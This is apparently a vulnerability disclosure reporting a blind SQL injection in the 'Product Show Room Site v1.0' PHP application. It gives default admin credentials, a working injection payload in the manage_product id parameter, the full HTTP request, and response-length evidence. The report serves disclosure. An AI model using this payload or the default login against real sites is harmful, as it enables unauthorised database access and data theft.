# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/admin/?page=products/manage_product&id=

Vulnerability location: /psrs/admin/?page=products/manage_product&id=, id

Current database name: hsrs_db ,length is 7

[+] Payload: /psrs/admin/?page=products/manage_product&id=3%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /psrs/admin/?page=products/manage_product&id=3%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```
When length (database ()) = 6, Content-Length: 33616
![image](https://user-images.githubusercontent.com/54017627/171828637-4b7f41a7-a2ea-4d7a-9a40-5dd5a896eda8.png)

![image](https://user-images.githubusercontent.com/54017627/171828731-e5740568-0489-4d87-a8c0-0173246550aa.png)

When length (database ()) = 7, Content-Length: 34389
![image](https://user-images.githubusercontent.com/54017627/171828602-802cf3c1-7850-4532-9873-8c6ede4e980c.png)

![image](https://user-images.githubusercontent.com/54017627/171828696-9d13a888-3db0-4873-8083-8db74632122a.png)
